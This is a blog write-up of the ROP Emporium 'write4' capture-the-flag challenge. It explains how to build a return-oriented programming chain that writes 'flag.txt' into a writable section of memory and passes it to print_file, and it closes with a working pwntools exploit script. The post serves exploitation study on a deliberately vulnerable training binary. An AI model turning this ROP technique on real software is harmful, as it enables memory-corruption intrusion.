---
layout: post
title: ropemporium - write4
date: 2024-12-27 13:37:00 +0300
description: 
img: write4-cover.png
fig-caption: 
tags:
  - ctf
---
*The 4th challenge from ropemporium. This challenge was pretty straightforward, learned about writing strings into a place in memory then picking up that address for usage as parameter. From now looks like we are starting to actually build a CHAIN.*

The intent of this challenge, accordingly to the website guide is to do the following:
1. Write the string "**flag.txt**" into some valid place in memory;
2. Pass that address as a parameter for the "**print_file()**" function.

Checking the program's protections:

![write4]({{site.baseurl}}/assets/img/write4-1.png)

- Partial *RELRO*
- *NX*

Going to the first step, detecting the buffer overflow, so we sent a 100 byte long pattern generated with *msf-pattern_create* and checked with *msf-pattern_offset*.

![write4]({{site.baseurl}}/assets/img/write4-2.png)

Capturing the **RSP** value, we got exact match at offset 40.

![write4]({{site.baseurl}}/assets/img/write4-3.png)

Before starting, we have to consider some things:
1. We have to find a valid writable **and** readable place in memory to put our "**flag.txt**" string.
2. As the challenge suggests, find a gadget that could move our string into that address, e.g. `mov [eax], ebx`

> Quickly saying, I was naive enough to think that passing the string "**flag.txt**" directly as a parameter on **RDI** was going to work, but unfortunately, the function tried to resolve the address for the string passed as parameter, and I could not execute it properly. So by writing the string into a proper memory region and passing its address to `POP RDI`, we comply with both memory permissions and the assumptions the function has about its input.

Taking a look into the program's sections, it was noted a readable and writable section on "**.data**" section, normally used for initialized data.

![write4]({{site.baseurl}}/assets/img/write4-4.png)

Before writing into that section, a double check for existing data inside the address is recommended so the program won't break when running the exploit.

Checking the "**.data**" section if there's some data inside of, it was noted that no data was present until *0x601038*, so all clear for a short string like "**flag.txt**"!

![write4]({{site.baseurl}}/assets/img/write4-5.png)

Talking about the gadgets, two very interesting were present when searching: 

![write4]({{site.baseurl}}/assets/img/write4-6.png)

```
0x0000000000400628 : mov qword ptr [r14], r15 ; ret
0x0000000000400690 : pop r14 ; pop r15 ; ret
```

With those gadgets, it's possible now to manipulate two registers and use them to send data inside an address, pretty handy tho.

Now, a `pop RDI` is needed to pass the parameter as the calling convention.

![write4]({{site.baseurl}}/assets/img/write4-7.png)

```
0x0000000000400693 : pop rdi ; ret
```

The next step is to get the "print_file()" function address. Checking for imported functions, we can see that it is being imported on the `0x400510` address.

![write4]({{site.baseurl}}/assets/img/write4-8.png)

As so, on the "**.plt**" section.

![write4]({{site.baseurl}}/assets/img/write4-9.png)

So now, all the resources to build the ROP chain were gathered:
1. 40 byte buffer filler
2. Gadget address `pop r14 ; pop r15 ; ret`
3. `.data` Section address
4. `flag.txt` byte string
5. Gadget address `mov qword ptr [r14], r15 ; ret`
6. Gadget address `pop rdi`
7. `print_file()` Function Address

Merging all the logic into the final exploit:

{% highlight python %}
from pwn import *

elf = context.binary = ELF('./write4')

FILL = (b"A"*40)
POP_R14_R15 = p64(0x400690)
DATA_SEC = p64(0x00601028)
STR_FLAG = b"flag.txt"
MOV_R14_R15 = p64(0x400628)
POP_RDI = p64(0x400693)
DATA_SEC = p64(0x00601028)
PRINT_FILE = p64(0x400510)

rop_chain = FILL 
rop_chain += POP_R14_R15 
rop_chain += DATA_SEC 
rop_chain += STR_FLAG 
rop_chain += MOV_R14_R15 
rop_chain += POP_RDI 
rop_chain += DATA_SEC 
rop_chain += PRINT_FILE

io = process(elf.path)
io.sendline(rop_chain)
io.interactive()
{% endhighlight %}

And executing it, we got the flag:

![write4]({{site.baseurl}}/assets/img/write4-10.png)
